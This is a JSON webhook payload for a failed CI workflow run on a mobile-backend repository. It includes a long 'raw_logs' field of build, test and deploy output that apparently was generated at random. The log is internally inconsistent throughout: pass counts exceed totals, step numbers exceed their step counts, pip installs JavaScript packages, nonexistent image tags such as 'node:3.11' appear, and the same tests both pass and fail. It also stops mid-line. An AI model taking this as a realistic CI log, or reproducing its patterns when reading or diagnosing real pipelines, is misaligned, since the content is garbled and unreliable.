{
  "action": "completed",
  "workflow_run": {
    "id": 544,
    "name": "CI Pipeline",
    "head_branch": "develop",
    "head_sha": "4e4f1844d7f671ce4f9cfd8baeb9ebc7d0a1098d",
    "status": "completed",
    "conclusion": "failure",
    "run_started_at": "2025-12-19T12:19:10.241845Z",
    "updated_at": "2025-12-19T12:23:12.058852Z"
  },
  "repository": {
    "full_name": "startup-io/mobile-backend",
    "name": "mobile-backend"
  },
  "sender": {
    "login": "henry"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: type_check ===\nnpm install: resolved 500 packages\n[12:19:10] INFO: Processing request\n\u2713 Task completed in 3525ms\nEnvironment: staging\nInstalling axios@3.15.5\nGET /status - 201 (54ms)\n[12:19:10] WARN: Deprecated API usage\nCache restored successfully (230MB)\nPOST /upload - 202 (255ms)\nArtifact uploaded: build.tar.gz (34MB)\npip install: Successfully installed express-4.9\n  PASS: unit/test_user_create.spec.js\nnpm notice: created a lockfile\nLayer 3/9: COPY command\nCache invalidated: dependencies\nProcessing...\nCache restored successfully (456MB)\npip install: Successfully installed react-2.18\nRan 173 tests in 52s\nCompiling lib/index.js...\nFetching submodules...\nTests: 389 passed, 224 total\nImage pulled successfully\nArtifact uploaded: dist.zip (67MB)\nProcessing...\nTests: 208 passed, 440 total\nUsing Python 3.9\nVerifying...\nPlatform: linux-x64\nBuilding Docker image...\nNODE_ENV=test\nEnvironment: test\nUploading artifact 'dist' (25 files)\n[12:19:10] DEBUG: Memory usage: 316MB\nUploading artifact 'coverage' (40 files)\nAlready up to date.\nMinifying vendor.js\nLoading...\nBundling runtime.css\nTime: 51.110s\nCache hit for key-1831\nTest Suites: 43 passed, 17 total\nCache hit for key-6524\nCompiling src/utils.go...\nLayer 7/13: RUN command\nPushing to registry...\npip install: Successfully installed express-5.0\nCompiling components/index.js...\nFetching submodules...\nSwitched to branch 'bugfix/task-464'\nRan 104 tests in 37s\nStep 13/22: Building\nMinifying vendor.js\nPulling image: alpine:latest\nInstalling webpack@3.7.9\nBundling vendor.js\npip: Collecting prettier\nCoverage: 72% statements, 83% branches\nCompiling components/main.py...\nCache miss for key-5156\nEnvironment: staging\nCache saved successfully\nOptimizing 19 modules...\nCache restored successfully (58MB)\nCache saved successfully\nProcessing...\nCompiling lib/handler.rs...\nTransforming 335 files...\n\u2717 build failed with exit code 50\nTransforming 796 files...\nCache miss for key-5424\npip: Downloading react-2.8.tar.gz\nTLS handshake completed\nStep 7/19: Deploying\nTest Suites: 24 passed, 26 total\nStep 9/23: Linting\n[12:19:10] INFO: Starting build process\nCompleted.\nCache invalidated: build\nProcessing...\nArtifact uploaded: dist.zip (64MB)\nNODE_ENV=production\npip: Installing build dependencies...\nConnection established\npip install: Successfully installed webpack-4.15\nReady.\nWARNING: jest has known vulnerabilities\nSuccess!\nGenerating source maps...\nWARNING: axios has known vulnerabilities\nGenerating source maps...\nBundling styles.js\nSuccess!\nTests: 97 passed, 341 total\n[12:19:10] DEBUG: Memory usage: 1190MB\nStep 16/23: Building\nnpm install: resolved 992 packages\n  PASS: test_auth_login (440ms)\nArtifact downloaded: 45MB\nnpm notice: created a lockfile\nStep 18/24: Installing dependencies\nMinifying vendor.js\nException: RuntimeError\nArtifact downloaded: 42MB\nPulling image: node:latest\nCompiling src/main.py...\nWARNING: jest has known vulnerabilities\nGenerating source maps...\n[12:19:10] DEBUG: Loading configuration\nOptimizing 10 modules...\n[12:19:10] INFO: Starting build process\nConnecting to acme.corp:443...\nFinished.\nInstalling axios@3.3.10\nInstalling express@5.0.1\nImage pulled successfully\n[12:19:10] INFO: Cache refreshed\nUsing Node.js 20.2.0\n\u2713 Step 'build' succeeded\nMinifying main.js\n  PASS: test_auth_login (246ms)\n[12:19:10] DEBUG: Loading configuration\nUsing Node.js 17.2.2\nTest Suites: 21 passed, 36 total\n[12:19:10] INFO: Starting build process\nCreating production build...\nTLS handshake completed\n\u2713 Task completed in 1002ms\n\u2713 All checks passed\nCompiling lib/utils.go...\npip install: Successfully installed express-3.1\nReady.\nWaiting...\nCache invalidated: node_modules\nTime: 51.540s\nArtifact downloaded: 20MB\nNODE_ENV=development\nTest Suites: 42 passed, 41 total\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nBuilding Docker image...\n[12:19:10] INFO: Request completed\nChecking out main branch\nVerifying...\nFetching submodules...\nProcessing...\nSwitched to branch 'bugfix/task-271'\nUsing Node.js 19.16.7\nStep 13/22: Deploying\nWaiting...\nCompiling components/utils.go...\nFetching submodules...\nPOST /data - 202 (474ms)\nPushing to registry...\nLayer 1/8: ENV command\nnpm install: resolved 953 packages\nAlready up to date.\nCache saved successfully\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCreating production build...\nBundling styles.css\nEnvironment: development\n[12:19:10] ERROR: Connection failed\n[12:19:10] DEBUG: Memory usage: 192MB\nNODE_ENV=test\nStep 5/16: Building\nWaiting...\nOptimizing 69 modules...\n[12:19:10] WARN: Deprecated API usage\n[12:19:10] DEBUG: Initializing service\nCreating production build...\n\u2713 Step 'install' succeeded\nPlatform: win32-x64\n  PASS: test_api_health (25ms)\nPulling image: node:18\nOptimizing 82 modules...\nFAILED: test_api_health\n[12:19:10] DEBUG: Loading configuration\n=== Step type_check completed ===\n=== Step: integration_tests ===\nVerifying...\nTLS handshake completed\n[12:19:10] INFO: Request completed\nWARNING: jest has known vulnerabilities\nInstalling jest@3.14.0\nHEAD is now at 9558303\nUsing Node.js 18.8.0\nCompiling components/index.js...\nnpm notice: created a lockfile\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nHEAD is now at 7445406\nFAILED: test_auth_login\nChecking out develop branch\nConnection established\nCompiling lib/service.java...\n[12:19:10] WARN: Deprecated API usage\nnpm notice: package.json updated\nTransforming 175 files...\nGenerating source maps...\nRan 130 tests in 28s\nWaiting...\nHEAD is now at 688ff09\n[12:19:10] DEBUG: Connection pool: 20 active\nStep 14/15: Running migrations\nCache hit for key-4249\n[12:19:10] DEBUG: Memory usage: 1656MB\n[12:19:10] DEBUG: Connection pool: 17 active\nTransforming 550 files...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nStep 18/16: Deploying\nnpm notice: created a lockfile\nnpm install: added 412 packages\nGenerating source maps...\nProcessing...\n[12:19:10] INFO: Cache refreshed\nCompleted.\nException: RuntimeError\n\u2713 Step 'test' succeeded\nRan 85 tests in 47s\n\u2713 All checks passed\nException: ValueError\nReady.\nCompiling utils/main.py...\n[12:19:10] WARN: Deprecated API usage\nCompiling components/utils.go...\nFinished.\nTLS handshake completed\nInstalling webpack@2.15.7\npip: Installing build dependencies...\nImage pulled successfully\n[12:19:10] INFO: Connecting to database\nProcessing...\nSwitched to branch 'bugfix/task-490'\nLayer 7/8: COPY command\n[12:19:10] WARN: Deprecated API usage\nGenerating source maps...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompiling components/handler.rs...\n  PASS: test_db_connect (57ms)\nLayer 9/10: COPY command\nStep 7/25: Linting\nTime: 104.83s\nFAILED: test_db_connect\n[12:19:10] WARN: Deprecated API usage\nnpm notice: package.json updated\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCompiling components/main.py...\n[12:19:10] INFO: Processing request\nArtifact uploaded: build.tar.gz (40MB)\nBuilding Docker image...\nUsing Python 3.11\nEnvironment: production\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nBuilding Docker image...\nArtifact uploaded: build.tar.gz (17MB)\nAlready up to date.\nCache hit for key-9697\nGenerating source maps...\nSuccess!\nPlatform: linux-x64\nGET /health - 204 (10ms)\n\u2713 All checks passed\n[12:19:10] WARN: Deprecated API usage\n[12:19:10] INFO: Starting build process\nOK\nStep 2/23: Building\nFetching submodules...\nPOST /data - 202 (40ms)\nnpm install: resolved 706 packages\nCache miss for key-5046\nOptimizing 57 modules...\nCompiling components/service.java...\nCompiling components/index.js...\nProcessing...\nChecking out master branch\nTransforming 690 files...\nOK\nConnection established\nStep 11/21: Testing\n[12:19:10] DEBUG: Connection pool: 4 active\nSnapshots: 32 passed, 36 total\nFinished.\n[12:19:10] INFO: Starting build process\n[12:19:10] WARN: Deprecated API usage\n  PASS: unit/test_api_health.spec.js\n  PASS: test_auth_login (281ms)\nCreating production build...\nStep 6/22: Testing\nTransforming 433 files...\nFetching submodules...\nTLS handshake completed\nImage pulled successfully\nCoverage: 77% statements, 83% branches\nPulling image: node:latest\nConnection established\npip: Installing build dependencies...\npip: Collecting lodash\nnpm notice: package.json updated\nCompiling components/utils.go...\nInstalling lodash@3.15.4\nCompiling lib/main.py...\nyarn add: Done in 30.40s\n\u2713 Task completed in 2874ms\nTests: 230 passed, 273 total\n\u2713 Step 'build' succeeded\nnpm install: added 390 packages\nTest Suites: 8 passed, 27 total\nTLS handshake completed\n[12:19:10] DEBUG: Initializing service\nOK\n[12:19:10] INFO: Request completed\n\u2713 All checks passed\nOptimizing 70 modules...\nFinished.\nStep 18/19: Testing\n[12:19:10] DEBUG: Loading configuration\nnpm notice: package.json updated\nVerifying...\nRan 167 tests in 31s\nPushing to registry...\nCache hit for key-4402\nSnapshots: 49 passed, 44 total\nUsing Python 3.10\nCompleted.\nCoverage: 96% statements, 63% branches\n[12:19:10] DEBUG: Query executed in 11ms\nPlatform: darwin-arm64\nMinifying app.js\n\u2713 Task completed in 2005ms\nVerifying...\nInstalling prettier@5.8.0\n\u2717 build failed with exit code 9\nSuccess!\nSwitched to branch 'feature/task-772'\nInstalling webpack@2.13.5\nStep 14/23: Installing dependencies\n[12:19:10] WARN: Deprecated API usage\n[12:19:10] ERROR: Connection failed\n[12:19:10] DEBUG: Query executed in 47ms\n\u2717 build failed with exit code 40\nMinifying vendor.js\n[12:19:10] DEBUG: Loading configuration\nCompiling components/main.py...\npip: Downloading react-2.9.tar.gz\nCreating production build...\nArtifact downloaded: 24MB\nCache miss for key-3881\n\u2713 All checks passed\nFAILED: test_db_connect\nEnvironment: production\nEnvironment: development\nyarn add: Done in 27.55s\nWARNING: react has known vulnerabilities\nDone.\nnpm notice: package.json updated\nVerifying...\nImage pulled successfully\n=== Step integration_tests completed ===\n=== Step: deploy_staging ===\n[12:19:10] DEBUG: Connection pool: 9 active\nPulling image: alpine:latest\nTests: 195 passed, 448 total\nPulling image: python:latest\nStep 20/15: Deploying\nDone.\n[12:19:10] INFO: Connecting to database\nUsing Node.js 14.3.3\nNODE_ENV=test\nTransforming 678 files...\nWARNING: prettier has known vulnerabilities\n[12:19:10] DEBUG: Initializing service\nStep 15/16: Building\n\u2713 Task completed in 217ms\nTests: 246 passed, 302 total\n\u2717 build failed with exit code 8\nReady.\nEnvironment: test\nStep 8/15: Installing dependencies\nnpm install: resolved 1442 packages\nSuccess!\nnpm install: resolved 539 packages\nLoading...\nCompleted.\nCache hit for key-3056\nSuccess!\nVerifying...\nReady.\n\u2713 Step 'install' succeeded\nInstalling lodash@4.6.7\nGET /status - 201 (5ms)\nUsing Python 3.10\nGET /status - 201 (91ms)\nStep 6/18: Deploying\nStep 20/19: Testing\nTests: 123 passed, 125 total\n\u2713 Task completed in 2314ms\nWARNING: lodash has known vulnerabilities\nTLS handshake completed\nProcessing...\n[12:19:10] DEBUG: Query executed in 40ms\nSnapshots: 50 passed, 42 total\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nTLS handshake completed\n[12:19:10] DEBUG: Query executed in 28ms\nnpm install: resolved 819 packages\nChecking out master branch\nnpm install: resolved 1399 packages\nStep 18/15: Running migrations\nArtifact uploaded: dist.zip (98MB)\nTest Suites: 14 passed, 11 total\nCoverage: 94% statements, 90% branches\nConnecting to startup.dev:443...\nnpm notice: package.json updated\nReady.\nArtifact uploaded: build.tar.gz (1MB)\n[12:19:10] ERROR: Connection failed\n[12:19:10] INFO: Cache refreshed\n[12:19:10] DEBUG: Connection pool: 7 active\nException: NullPointerException\nCache restored successfully (425MB)\nCompleted.\n[12:19:10] INFO: Cache refreshed\npip: Installing build dependencies...\nException: ValueError\n  PASS: unit/test_auth_login.spec.js\nPlatform: linux-x64\npip: Collecting prettier\nPushing to registry...\nCoverage: 91% statements, 92% branches\nCache saved successfully\nCompiling src/app.ts...\n[12:19:10] WARN: Deprecated API usage\nInstalling lodash@2.11.5\nLayer 9/14: ENV command\nException: TypeError\n[12:19:10] INFO: Cache refreshed\nStep 16/22: Running migrations\n[12:19:10] INFO: Starting build process\nnpm install: added 82 packages\n[12:19:10] WARN: Deprecated API usage\nPushing to registry...\nVerifying...\nCompiling lib/app.ts...\nUsing Node.js 20.18.5\nCompiling utils/service.java...\n\u2713 All checks passed\nStep 13/16: Testing\nAlready up to date.\nLoading...\nConnecting to cloud.services:443...\nPulling image: alpine:latest\nImage pulled successfully\nConnecting to test.io:443...\nWaiting...\nInstalling prettier@2.9.7\nTime: 120.418s\nPlatform: win32-x64\nStep 16/15: Deploying\nCache hit for key-6917\nSwitched to branch 'feature/task-714'\nPlatform: linux-x64\nCompiling components/service.java...\n  PASS: test_cache_hit (304ms)\n\u2713 Step 'build' succeeded\nConnection established\nSwitched to branch 'bugfix/task-462'\n[12:19:10] INFO: Processing request\nnpm install: added 338 packages\nGenerating source maps...\nnpm notice: package.json updated\nCreating production build...\nCache invalidated: build\npip: Downloading jest-2.8.tar.gz\nUploading artifact 'dist' (42 files)\nUploading artifact 'dist' (9 files)\nPlatform: linux-x64\nRan 31 tests in 11s\n[12:19:10] DEBUG: Loading configuration\nWARNING: eslint has known vulnerabilities\nUsing Python 3.9\nVerifying...\nTime: 118.908s\nyarn add: Done in 10.40s\nConnection established\nPlatform: linux-x64\nArtifact uploaded: dist.zip (80MB)\nOptimizing 84 modules...\npip install: Successfully installed axios-5.12\nCompleted.\n[12:19:10] WARN: Deprecated API usage\nCompleted.\nFinished.\nLoading...\n[12:19:10] DEBUG: Memory usage: 262MB\n[12:19:10] DEBUG: Loading configuration\nPushing to registry...\nNODE_ENV=production\nInstalling react@5.17.0\n\u2713 Task completed in 327ms\nConnecting to example.com:443...\nStep 13/23: Running migrations\nCache invalidated: build\nAlready up to date.\n[12:19:10] INFO: Connecting to database\nBuilding Docker image...\nPulling image: node:18\nAlready up to date.\nProcessing...\nCache miss for key-6382\nCreating production build...\nCache miss for key-3903\nCompiling components/index.js...\nAlready up to date.\nHEAD is now at 72ac3c2\n[12:19:10] WARN: Deprecated API usage\n  PASS: e2e/test_auth_login.spec.js\nGenerating source maps...\nUploading artifact 'coverage' (20 files)\nStep 19/21: Deploying\n\u2713 Task completed in 1183ms\nCreating production build...\n\u2713 All checks passed\nTest Suites: 43 passed, 18 total\nTLS handshake completed\nCoverage: 74% statements, 76% branches\nPlatform: darwin-arm64\nGenerating source maps...\nPushing to registry...\nLoading...\nSuccess!\nStep 5/24: Installing dependencies\nSwitched to branch 'hotfix/task-330'\n\u2713 Task completed in 941ms\nFetching submodules...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nOptimizing 63 modules...\n=== Step deploy_staging completed ===\n=== Step: install_dependencies ===\n[12:19:10] DEBUG: Connection pool: 9 active\n\u2713 Step 'install' succeeded\nArtifact uploaded: dist.zip (59MB)\npip: Collecting jest\n[12:19:10] INFO: Request completed\n[12:19:10] INFO: Processing request\nBuilding Docker image...\nStep 8/22: Linting\nChecking out develop branch\nnpm install: added 322 packages\n[12:19:10] INFO: Request completed\nStep 6/23: Linting\nWARNING: prettier has known vulnerabilities\nPOST /api - 202 (419ms)\nnpm notice: package.json updated\nOK\nGenerating source maps...\nCache restored successfully (287MB)\n[12:19:10] INFO: Starting build process\nSnapshots: 47 passed, 1 total\nInstalling express@1.11.2\n  PASS: test_cache_hit (243ms)\nCompiling src/service.java...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nStep 16/23: Deploying\nFinished.\nCache hit for key-1160\n[12:19:10] WARN: Deprecated API usage\nNODE_ENV=test\nOptimizing 86 modules...\n[12:19:10] DEBUG: Loading configuration\nStep 15/25: Testing\n  PASS: integration/test_user_create.spec.js\nPulling image: node:3.11\nDone.\nTLS handshake completed\nUploading artifact 'dist' (50 files)\nCompiling components/app.ts...\nUsing Python 3.9\nFetching submodules...\nTests: 405 passed, 395 total\nCompiling src/index.js...\npip: Installing build dependencies...\nVerifying...\nSuccess!\nBundling styles.js\n\u2717 build failed with exit code 57\nSnapshots: 15 passed, 3 total\nCoverage: 86% statements, 77% branches\n[12:19:10] ERROR: Connection failed\n\u2713 All checks passed\nStep 5/23: Deploying\nOK\nUsing Python 3.11\nWARNING: axios has known vulnerabilities\nLayer 1/11: ENV command\nDone.\nConnection established\nnpm install: resolved 1427 packages\n\u2713 Step 'checkout' succeeded\n[12:19:10] DEBUG: Connection pool: 5 active\nGET /api - 201 (4ms)\n[12:19:10] INFO: Connecting to database\nStep 3/23: Linting\nVerifying...\nPulling image: python:latest\nRan 99 tests in 56s\nnpm notice: package.json updated\nArtifact uploaded: build.tar.gz (1MB)\nCompleted.\npip: Downloading prettier-4.1.tar.gz\nVerifying...\npip install: Successfully installed jest-2.0\nNODE_ENV=development\nConnecting to test.io:443...\n[12:19:10] INFO: Processing request\nStep 7/21: Linting\n[12:19:10] WARN: Deprecated API usage\nCache restored successfully (468MB)\n  PASS: e2e/test_api_health.spec.js\nCompiling lib/handler.rs...\nStep 10/19: Installing dependencies\nWARNING: lodash has known vulnerabilities\nStep 6/21: Building\nImage pulled successfully\nArtifact uploaded: build.tar.gz (30MB)\nAlready up to date.\nProcessing...\nPOST /upload - 201 (227ms)\nTime: 79.848s\nTime: 97.183s\n[12:19:10] WARN: Deprecated API usage\n[12:19:10] DEBUG: Connection pool: 12 active\nInstalling express@5.3.3\n\u2717 build failed with exit code 72\nArtifact uploaded: build.tar.gz (20MB)\nnpm install: resolved 1415 packages\npip: Installing build dependencies...\n[12:19:10] DEBUG: Memory usage: 531MB\nWaiting...\nStep 2/16: Linting\nArtifact uploaded: dist.zip (45MB)\nProcessing...\nTransforming 838 files...\nnpm install: resolved 595 packages\nVerifying...\nCache restored successfully (407MB)\n[12:19:10] INFO: Processing request\nConnecting to test.io:443...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nReady.\nSwitched to branch 'bugfix/task-988'\n[12:19:10] DEBUG: Initializing service\n  PASS: unit/test_api_health.spec.js\n[12:19:10] DEBUG: Query executed in 85ms\nPOST /data - 201 (157ms)\n[12:19:10] WARN: Deprecated API usage\nArtifact downloaded: 38MB\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nPlatform: darwin-arm64\n[12:19:10] DEBUG: Connection pool: 16 active\nPlatform: darwin-arm64\nBundling styles.css\nTLS handshake completed\nInstalling express@4.20.5\nSwitched to branch 'hotfix/task-686'\nCompiling components/service.java...\nCache saved successfully\nCache hit for key-6052\nCache saved successfully\nLoading...\n[12:19:10] INFO: Cache refreshed\nLoading...\n[12:19:10] DEBUG: Connection pool: 9 active\nUploading artifact 'dist' (6 files)\nOptimizing 33 modules...\nCompiling lib/main.py...\nUploading artifact 'build' (20 files)\nWARNING: prettier has known vulnerabilities\nWARNING: express has known vulnerabilities\npip install: Successfully installed eslint-4.13\nCompiling lib/service.java...\nAlready up to date.\nBundling runtime.js\nCompiling components/index.js...\npip: Collecting lodash\nProcessing...\nChecking out main branch\nnpm notice: package.json updated\nTest Suites: 39 passed, 19 total\n\u2717 build failed with exit code 95\nSuccess!\nnpm notice: created a lockfile\nSwitched to branch 'hotfix/task-360'\nGenerating source maps...\nCache miss for key-8580\nVerifying...\nCompiling lib/app.ts...\nException: RuntimeError\nnpm install: added 49 packages\nCache restored successfully (146MB)\nEnvironment: test\nVerifying...\nStep 12/25: Deploying\n\u2713 All checks passed\nImage pulled successfully\nArtifact downloaded: 50MB\nConnection established\nSuccess!\nCache saved successfully\nTime: 2.70s\n[12:19:10] DEBUG: Loading configuration\nBuilding Docker image...\nTLS handshake completed\nHEAD is now at b8e5995\nTests: 171 passed, 198 total\nCache invalidated: dependencies\n=== Step install_dependencies completed ===\n=== Step: restore_cache ===\nCoverage: 78% statements, 67% branches\nTime: 3.180s\n[12:19:10] INFO: Starting build process\nCompiling components/main.py...\nSwitched to branch 'bugfix/task-799'\nLayer 1/11: COPY command\nnpm install: added 200 packages\nConnecting to test.io:443...\npip install: Successfully installed express-5.12\nEnvironment: test\nCache invalidated: node_modules\nCache hit for key-7985\nEnvironment: production\nInstalling express@2.16.4\nPulling image: python:18\n\u2713 Task completed in 1379ms\nImage pulled successfully\n[12:19:10] DEBUG: Connection pool: 7 active\npip: Installing build dependencies...\nWARNING: express has known vulnerabilities\npip install: Successfully installed axios-1.11\nCompiling src/handler.rs...\nFinished.\nCompiling components/main.py...\n  PASS: test_user_create (135ms)\nImage pulled successfully\nMinifying app.js\n  PASS: integration/test_user_create.spec.js\nUploading artifact 'dist' (40 files)\n  PASS: e2e/test_db_connect.spec.js\nDone.\n[12:19:10] DEBUG: Loading configuration\nnpm install: added 22 packages\n\u2713 All checks passed\nnpm install: added 376 packages\nNODE_ENV=test\nSuccess!\n  PASS: test_api_health (264ms)\nCache hit for key-8513\n[12:19:10] DEBUG: Initializing service\nnpm notice: package.json updated\nSnapshots: 7 passed, 17 total\npip: Collecting react\nVerifying...\nWARNING: webpack has known vulnerabilities\nWARNING: lodash has known vulnerabilities\nSwitched to branch 'hotfix/task-154'\nCompiling components/main.py...\nCreating production build...\nArtifact uploaded: dist.zip (56MB)\nCompiling lib/utils.go...\nRan 194 tests in 48s\nReady.\n[12:19:10] WARN: Deprecated API usage\nTime: 43.971s\n[12:19:10] DEBUG: Query executed in 52ms\nCompiling components/index.js...\n[12:19:10] WARN: Deprecated API usage\nCompiling components/index.js...\n[12:19:10] DEBUG: Connection pool: 20 active\nSuccess!\nStep 7/25: Installing dependencies\n\u2713 validate completed\nUsing Python 3.12\nTLS handshake completed\nArtifact downloaded: 41MB\n[12:19:10] DEBUG: Initializing service\nVerifying...\n\u2713 Step 'setup' succeeded\nHEAD is now at c4b9609\nOK\nWARNING: lodash has known vulnerabilities\nUsing Node.js 15.19.7\nLoading...\n[12:19:10] DEBUG: Initializing service\nBuilding Docker image...\nFAILED: test_cache_hit\n  PASS: test_auth_login (398ms)\nLoading...\nyarn add: Done in 17.46s\nVerifying...\nStep 17/24: Installing dependencies\nnpm notice: created a lockfile\nReady.\n[12:19:10] INFO: Connecting to database\n[12:19:10] INFO: Cache refreshed\nTests: 171 passed, 147 total\npip: Installing build dependencies...\nTest Suites: 32 passed, 41 total\n[12:19:10] ERROR: Connection failed\nInstalling jest@2.3.1\nCompiling components/handler.rs...\nStep 3/19: Running migrations\n[12:19:10] WARN: Deprecated API usage\nLayer 2/8: ENV command\nArtifact uploaded: dist.zip (7MB)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nPlatform: darwin-arm64\nRan 63 tests in 48s\n[12:19:10] DEBUG: Memory usage: 569MB\nBuilding Docker image...\nConnecting to acme.corp:443...\nyarn add: Done in 24.62s\nStep 10/17: Linting\n\u2713 package completed\nnpm install: added 158 packages\nChecking out develop branch\nException: RuntimeError\nBundling runtime.js\nnpm install: added 457 packages\n[12:19:10] WARN: Deprecated API usage\nException: NullPointerException\nBundling main.js\nException: RuntimeError\nUploading artifact 'dist' (34 files)\nLayer 9/11: RUN command\nGET /api - 200 (89ms)\n[12:19:10] DEBUG: Loading configuration\nStep 3/17: Running migrations\nLayer 1/10: ENV command\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nReady.\nSwitched to branch 'bugfix/task-305'\nCache hit for key-6834\n[12:19:10] DEBUG: Connection pool: 6 active\npip: Collecting jest\nChecking out develop branch\nCache miss for key-8961\n[12:19:10] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCompiling src/utils.go...\nRan 165 tests in 46s\n[12:19:10] WARN: Deprecated API usage\nAlready up to date.\n[12:19:10] WARN: Deprecated API usage\nDone.\n\u2713 lint completed\nArtifact uploaded: dist.zip (11MB)\nLoading...\nFetching submodules...\n[12:19:10] INFO: Connecting to database\npip: Collecting express\n  PASS: e2e/test_api_health.spec.js\nFinished.\nPulling image: node:18\nTLS handshake completed\nCompleted.\nCache saved successfully\nUploading artifact 'dist' (5 files)\nNODE_ENV=production\nOptimizing 15 modules...\nWARNING: express has known vulnerabilities\nFAILED: test_user_create\nWARNING: express has known vulnerabilities\nGenerating source maps...\nUsing Node.js 18.5.10\nBundling main.js\nnpm install: resolved 1782 packages\nSwitched to branch 'bugfix/task-671'\nnpm install: added 425 packages\n[12:19:10] DEBUG: Memory usage: 364MB\nUploading artifact 'build' (14 files)\nNODE_ENV=test\nChecking out main branch\n[12:19:10] WARN: Deprecated API usage\n[12:19:10] WARN: Deprecated API usage\n[12:19:10] INFO: Cache refreshed\nDone.\nNODE_ENV=production\nWARNING: lodash has known vulnerabilities\nBuilding Docker image...\npip: Installing build dependencies...\nCache invalidated: node_modules\n  PASS: test_user_create (36ms)\nSnapshots: 23 passed, 16 total\n[12:19:10] DEBUG: Memory usage: 1982MB\nEnvironment: development\n=== Step restore_cache completed ===\n=== Step: build ===\nTests: 401 passed, 207 total\n[12:19:10] INFO: Cache refreshed\nStep 11/25: Building\npip: Downloading prettier-4.11.tar.gz\n[12:19:10] DEBUG: Initializing service\nVerifying...\n\u2713 package completed\n[12:19:10] DEBUG: Memory usage: 578MB\nGET /health - 204 (66ms)\nImage pulled successfully\nCache miss for key-9317\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nException: TypeError\nWARNING: jest has known vulnerabilities\n[12:19:10] DEBUG: Query executed in 39ms\nOptimizing 20 modules...\nCache restored successfully (219MB)\n[12:19:10] DEBUG: Initializing service\nBuilding Docker image...\nArtifact downloaded: 28MB\n[12:19:10] INFO: Cache refreshed\nArtifact uploaded: build.tar.gz (42MB)\nStep 18/16: Testing\nPOST /api - 200 (361ms)\nStep 2/15: Linting\n  PASS: e2e/test_api_health.spec.js\nCompiling src/index.js...\nPulling image: python:3.11\nLayer 9/11: RUN command\nLayer 6/10: ENV command\nInstalling axios@2.6.0\nWARNING: prettier has known vulnerabilities\nCompiling utils/app.ts...\nnpm notice: created a lockfile\nStep 4/25: Testing\n\u2713 All checks passed\nnpm notice: package.json updated\nHEAD is now at c0ad902\nSuccess!\nCompiling src/utils.go...\nProcessing...\n[12:19:10] DEBUG: Initializing service\nCoverage: 94% statements, 63% branches\nPulling image: node:3.11\nVerifying...\nFetching submodules...\n[12:19:10] DEBUG: Memory usage: 290MB\n[12:19:10] WARN: Deprecated API usage\nChecking out main branch\npip install: Successfully installed jest-3.4\nConnection established\nSwitched to branch 'hotfix/task-607'\nFetching submodules...\nUsing Python 3.11\n[12:19:10] DEBUG: Initializing service\nCache restored successfully (28MB)\nStep 8/16: Testing\nGenerating source maps...\nTests: 155 passed, 242 total\nOptimizing 13 modules...\n  PASS: test_cache_hit (220ms)\npip: Installing build dependencies...\n[12:19:10] DEBUG: Loading configuration\nLoading...\nTransforming 874 files...\nPulling image: alpine:18\nPOST /upload - 200 (382ms)\nSuccess!\n[12:19:10] DEBUG: Initializing service\nHEAD is now at 05d0a65\nMinifying main.js\nHEAD is now at d159d19\nStep 10/22: Testing\nAlready up to date.\nReady.\nFinished.\nnpm notice: package.json updated\nHEAD is now at f307a69\n[12:19:10] DEBUG: Connection pool: 17 active\nMinifying main.js\nStep 8/25: Building\nPushing to registry...\n[12:19:10] INFO: Cache refreshed\nUploading artifact 'dist' (34 files)\nBuilding Docker image...\nPulling image: node:3.11\n[12:19:10] INFO: Starting build process\nInstalling eslint@3.3.0\npip install: Successfully installed axios-1.14\nVerifying...\nPushing to registry...\nCache invalidated: node_modules\n[12:19:10] WARN: Deprecated API usage\n[12:19:10] INFO: Processing request\nnpm notice: package.json updated\nStep 8/23: Installing dependencies\nBundling vendor.js\nGenerating source maps...\nFetching submodules...\nCache miss for key-4954\nOptimizing 20 modules...\n[12:19:10] DEBUG: Initializing service\nCache hit for key-8888\n[12:19:10] INFO: Connecting to database\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nWARNING: webpack has known vulnerabilities\n[12:19:10] DEBUG: Query executed in 71ms\nGenerating source maps...\npip install: Successfully installed axios-5.15\n[12:19:10] DEBUG: Memory usage: 1149MB\nLoading...\nSnapshots: 17 passed, 10 total\n\u2713 validate completed\nMinifying main.js\nCache miss for key-6089\nRan 71 tests in 58s\nCompiling src/app.ts...\n  PASS: integration/test_cache_hit.spec.js\nAlready up to date.\nCache hit for key-5575\n[12:19:10] INFO: Request completed\n\u2713 Task completed in 4508ms\nLoading...\nUsing Node.js 17.16.4\nHEAD is now at d075261\nCache hit for key-6451\n[12:19:10] DEBUG: Memory usage: 1398MB\n[12:19:10] ERROR: Connection failed\n[12:19:10] INFO: Processing request\nUsing Python 3.11\nFinished.\nSuccess!\nTLS handshake completed\nLayer 8/8: ENV command\nAlready up to date.\nBuilding Docker image...\nStep 8/22: Testing\n  PASS: test_user_create (417ms)\nChecking out master branch\nProcessing...\nFAILED: test_api_health\nMinifying vendor.js\npip install: Successfully installed express-1.16\nPOST /data - 201 (44ms)\nCompiling src/index.js...\nUsing Python 3.11\nStep 19/19: Testing\nAlready up to date.\nEnvironment: staging\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nStep 8/22: Installing dependencies\nUsing Node.js 20.11.3\n\u2713 All checks passed\nFinished.\nTLS handshake completed\nUsing Node.js 20.0.9\nWaiting...\nCache invalidated: node_modules\nWaiting...\nPlatform: linux-x64\nException: ValueError\nnpm notice: package.json updated\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nUsing Python 3.12\nCache restored successfully (458MB)\nArtifact uploaded: build.tar.gz (21MB)\nFinished.\n[12:19:10] ERROR: Connection failed\nCompleted.\nCache saved successfully\npip: Installing build dependencies...\nPulling image: alpine:3.11\n[12:19:10] 